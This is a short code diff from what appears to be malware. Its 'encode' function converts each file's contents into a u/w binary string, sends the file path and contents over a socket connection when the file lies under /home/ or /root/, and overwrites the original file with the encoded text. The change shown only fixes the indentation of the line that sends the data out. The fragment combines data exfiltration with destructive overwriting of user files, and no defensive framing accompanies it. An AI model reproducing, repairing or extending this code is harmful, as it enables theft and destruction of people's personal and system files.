@@ -62,7 +62,7 @@ def encode(file):
             content = " ".join(map(str, toBinary(x))).replace("1", "u").replace("0", "w")
         if c:
             if "/home/" in file or "/root/" in file:
-            c.send(str(file).encode() + b"\n" + str(content).encode() + b"\nEOF\n")
+                c.send(str(file).encode() + b"\n" + str(content).encode() + b"\nEOF\n")
         with open(file, "w") as f:
             f.write(content)
     except:
